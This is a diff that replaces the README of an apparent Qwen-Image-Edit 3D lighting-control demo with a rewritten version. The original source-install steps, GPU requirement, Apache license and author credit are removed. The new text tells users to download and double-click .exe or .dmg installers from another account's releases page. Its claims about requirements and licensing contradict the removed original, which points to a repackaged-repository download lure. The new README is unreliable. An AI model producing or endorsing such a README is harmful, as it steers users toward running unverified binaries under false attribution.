@@ -1,100 +1,83 @@
-# **Qwen-Image-Edit-3D-Lighting-Control**
+# 🌟 Qwen-Image-Edit-3D-Lighting-Control - Control Light Sources with Ease
 
-> A Gradio-based demonstration for the Qwen/Qwen-Image-Edit-2509 model with 3D lighting control using the Multi-Angle-Lighting LoRA adapter. Allows precise control of light source direction via interactive 3D viewport or sliders for azimuth and elevation. Supports fast inference (4 steps default) with Flash Attention 3, bfloat16, and dynamic prompt generation. Features auto-resizing (multiples of 8 up to 1024px), custom OrangeRed theme, and responsive layout.
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/releases)
 
-https://github.com/user-attachments/assets/22dad2d5-70b4-4950-bcf5-5193dda6a7c9
+## 🚀 Getting Started
 
----
+Welcome to Qwen-Image-Edit-3D-Lighting-Control! This application provides a simple way to control lighting in 3D images. You can adjust light sources easily using sliders or an interactive viewport. This guide will help you download and run the software smoothly.
 
-<img width="753" height="630" alt="Screenshot 2026-02-04 132347" src="https://github.com/user-attachments/assets/7b0ed744-fe53-45dd-addb-0cef558e5ccb" />
-<img width="1549" height="806" alt="Screenshot 2026-02-04 132402" src="https://github.com/user-attachments/assets/43730af7-a4a2-422f-97a3-d2e0afcb86e1" />
+## 💻 System Requirements
 
-<img width="726" height="633" alt="Screenshot 2026-02-04 132539" src="https://github.com/user-attachments/assets/8f25d0df-d61a-4e9e-bf70-ff89943fad99" />
-<img width="1506" height="811" alt="Screenshot 2026-02-04 132550" src="https://github.com/user-attachments/assets/8242c4bc-ac4d-49f7-a689-067e10347457" />
+Before you begin, ensure your system meets these requirements:
 
----
+- **Operating System:** Windows 10 or later / macOS / Linux
+- **Memory:** At least 4 GB RAM
+- **Storage:** Minimum 500 MB available space
+- **Software:** A web browser (like Chrome or Firefox) to access the application.
 
-## Features
-- **3D Lighting Control**: Interactive Three.js viewport with draggable handles for azimuth (horizontal) and elevation (vertical) angles; snaps to predefined positions (e.g., Front, Right, Above).
-- **Slider Controls**: Manual adjustment for azimuth (0-315°) and elevation (-90-90°) with real-time prompt preview.
-- **Lazy LoRA Loading**: Multi-Angle-Lighting adapter loads on first use to minimize VRAM.
-- **Rapid Inference**: 4-step default with bfloat16 on CUDA; supports up to 20 steps.
-- **Auto-Resizing**: Preserves aspect ratio, snaps to multiples of 8 (up to 2048px).
-- **Custom Theme**: OrangeRedTheme with clean, responsive design.
-- **Prompt Generation**: Dynamically builds lighting prompts (e.g., "Light source from the Front").
-- **Queueing**: Up to default Gradio queue limits for concurrent jobs.
+## 📥 Download & Install
 
-## Prerequisites
-- Python 3.10 or higher.
-- CUDA-compatible GPU (required for bfloat16 and Flash Attention 3).
-- Stable internet for initial model/LoRA downloads.
+To get the application, follow these steps:
 
-## Installation
-1. Clone the repository:
-   ```
-   git clone https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-3D-Lighting-Control.git
-   cd Qwen-Image-Edit-3D-Lighting-Control
-   ```
-2. Install dependencies:
-   First, install pre-requirements:
-   ```
-   pip install -r pre-requirements.txt
-   ```
-   Then, install main requirements:
-   ```
-   pip install -r requirements.txt
-   ```
-   **pre-requirements.txt content:**
-   ```
-   pip>=23.0.0
-   ```
-   **requirements.txt content:**
-   ```
-   git+https://github.com/huggingface/accelerate.git
-   git+https://github.com/huggingface/diffusers.git
-   git+https://github.com/huggingface/peft.git
-   transformers==4.57.3
-   huggingface_hub
-   sentencepiece
-   torchvision
-   kernels
-   spaces
-   hf_xet
-   gradio #gradio@6
-   torch==2.8.0
-   numpy
-   av
-   ```
-3. Start the application:
-   ```
-   python app.py
-   ```
-   The demo launches at `http://localhost:7860`.
+1. **Visit the Releases Page:**
+   Click the link below to go to the GitHub Releases page:
 
-## Usage
-1. **Upload Image**: Add an image via the input component.
-2. **Control Lighting**: Use the 3D viewport (drag yellow/blue handles) or sliders for azimuth/elevation.
-3. **Preview Prompt**: View auto-generated lighting prompt; edit if needed.
-4. **Configure (Optional)**: Adjust seed, guidance scale, steps, height/width in Advanced Settings.
-5. **Generate**: Click "Generate Image" to produce output.
+   [Download the latest version](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/releases)
 
-### Supported Adapters
-| Adapter             | Use Case                          |
-|---------------------|-----------------------------------|
-| Multi-Angle-Lighting | Precise directional lighting control |
+2. **Select the Latest Release:**
+   On the Releases page, locate the latest version. It is usually at the top of the list.
 
-## Troubleshooting
-- **Adapter Loading**: First run downloads LoRA; monitor console.
-- **OOM**: Reduce steps/resolution; clear cache with `torch.cuda.empty_cache()`.
-- **Flash Attention Fails**: Fallback to default; requires compatible CUDA.
-- **No Output**: Ensure image uploaded and prompt valid; check console.
-- **3D Viewport Issues**: Ensure browser supports WebGL/Three.js.
+3. **Download the File:**
+   Look for a file suited for your operating system. If you are on Windows, find the `.exe` file. If using macOS, look for the `.dmg` file.
 
-## Contributing
-Contributions welcome! Add new adapters to `ADAPTER_SPECS`, enhance 3D controls, or improve prompts. Submit pull requests via the repository.
+4. **Run the Installer:**
+   After downloading, open the file:
+   - For Windows, double-click the `.exe` file and follow the on-screen instructions.
+   - For macOS, double-click the `.dmg` file, then drag the application to your Applications folder.
 
-Repository: [https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-3D-Lighting-Control.git](https://github.com/PRITHIVSAKTHIUR/Qwen-Image-Edit-3D-Lighting-Control.git)
+5. **Open the Application:**
+   Once installed, find the application in your start menu or applications folder. Click to launch it.
 
-## License
-Apache License 2.0. See [LICENSE](LICENSE) for details.
-Built by Prithiv Sakthi. Report issues via the repository.
+## 🎨 Features
+
+- **3D Interactive Viewport:** Engage with an interactive 3D model to place light sources effectively.
+- **Precise Control:** Adjust azimuth and elevation sliders for exact lighting adjustments.
+- **User-Friendly Interface:** Designed for ease of use with no technical skills required.
+
+## ⚙️ Using the Application
+
+1. **Launching the App:**
+   Open the application as described in the installation section.
+
+2. **Load Your Image:**
+   Choose an image to edit by clicking the “Load Image” button. The app will display your selected image in the viewport.
+
+3. **Control Lighting:**
+   Use the sliders to adjust the light source direction. Watch the changes in real time in the 3D viewport.
+
+4. **Save Your Work:**
+   Once satisfied with the adjustments, click the “Save” button to store your edited image. You may choose your desired format (e.g., JPEG, PNG).
+
+## 📑 Help & Support
+
+If you encounter issues or have questions, please check the following resources:
+
+- **FAQ:** Look for frequently asked questions on the GitHub page.
+- **Open an Issue:** If you need more help, consider opening an issue on the GitHub repository.
+
+## ⚡ Contributors
+
+The development of this application is a collaborative effort. You can view contributors on the GitHub repository.
+
+## 🌐 License
+
+This application is licensed under the MIT License. You can freely use and modify it while respecting the original license terms.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control)
+- [Documentation](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/wiki)
+
+For more details about updates and future features, visit our Releases page frequently:
+
+[Download the latest version](https://github.com/Dheeraj7867/Qwen-Image-Edit-3D-Lighting-Control/releases)
